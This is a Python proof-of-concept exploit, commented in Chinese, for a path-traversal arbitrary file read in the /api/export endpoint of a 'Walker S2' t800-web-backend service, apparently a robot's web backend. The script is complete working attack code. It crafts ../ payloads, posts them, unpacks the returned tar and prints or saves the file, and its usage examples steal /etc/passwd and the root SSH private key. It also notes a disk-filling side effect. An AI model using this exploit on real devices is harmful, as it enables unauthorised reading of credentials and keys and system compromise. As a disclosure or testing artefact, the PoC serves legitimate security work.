#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Walker S2 · t800-web-backend /api/export 路径穿越任意文件读 PoC（实机验证版）

用法:
    python export_traversal.py                        # 读 /etc/hostname（默认，最小影响）
    python export_traversal.py --path /etc/passwd     # 读任意文件
    python export_traversal.py --path /root/.ssh/id_rsa --out key.pem   # 读 SSH 私钥并存盘
    python export_traversal.py --host 127.0.0.1       # 指定目标（默认 192.168.11.3:5000）

原理:
    POST /api/export {"map_names":["<穿越路径>"]}，map_names 与基准目录 /etc/walker/map/ 直接
    os.path.join，未做 realpath/前缀校验。读 /etc/hostname 需 ../../../etc/hostname。

注意: 每次成功导出会在设备 /tmp/exports/tmp*/ 留档（磁盘填满 DoS 副作用）。
"""
import argparse
import io
import json
import sys
import tarfile

import requests

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

MAP_ROOT = "/etc/walker/map"   # 实机错误信息泄露的基准目录
DEFAULT_HOST = "192.168.11.3"
PORT = 5000


def to_traversal(abs_path: str) -> str:
    """把绝对路径转成相对 MAP_ROOT 的穿越路径。
    基准 /etc/walker/map 有 3 个路径段 → 3 个 ../ 回到根。"""
    depth = len([s for s in MAP_ROOT.split("/") if s])
    return "../" * depth + abs_path.lstrip("/")


def main():
    ap = argparse.ArgumentParser(description="/api/export 路径穿越任意文件读")
    ap.add_argument("--host", default=DEFAULT_HOST, help=f"目标主机（默认 {DEFAULT_HOST}）")
    ap.add_argument("--path", default="/etc/hostname", help="要读取的绝对路径（默认 /etc/hostname）")
    ap.add_argument("--out", default=None, help="把读到的文件保存到本地路径")
    args = ap.parse_args()

    base = f"http://{args.host}:{PORT}"
    trav = to_traversal(args.path)
    body = {"map_names": [trav]}

    print("=" * 66)
    print("[*] 漏洞   : /api/export 路径穿越任意文件读")
    print(f"[*] 目标   : {base}/api/export")
    print(f"[*] 读取   : {args.path}")
    print(f"[*] payload: map_names = {trav!r}")
    print(f"[*] 基准   : {MAP_ROOT}/  (未校验拼接)")
    print("=" * 66)
    print(f"\n[>] POST {base}/api/export")
    print(f"    headers : Content-Type: application/json")
    print(f"    body    : {json.dumps(body)}")

    r = requests.post(f"{base}/api/export", json=body, timeout=15)
    print(f"[<] HTTP {r.status_code}  size={len(r.content)}B")

    if r.status_code != 200:
        print(f"[!] 失败 detail: {r.text[:300]}")
        sys.exit(1)

    data = r.content
    is_gzip = data[:2] == b'\x1f\x8b'
    print(f"[*] gzip 头 : {is_gzip}")
    try:
        t = tarfile.open(fileobj=io.BytesIO(data), mode="r:*")
        for m in t.getmembers():
            print(f"[+] tar 成员 : {m.name}  ({m.size}B)")
            f = t.extractfile(m)
            content = f.read() if f else b""
            print("    -------- 文件内容 --------")
            try:
                print(content.decode("utf-8", errors="replace"))
            except Exception:
                print(repr(content[:500]))
            print("    ---------------------------")
            if args.out:
                with open(args.out, "wb") as fo:
                    fo.write(content)
                print(f"[+] 已保存到: {args.out}")
    except Exception as e:
        print(f"[!] tar 解析失败: {e}\n    原始响应头: {data[:200]!r}")


if __name__ == "__main__":
    main()
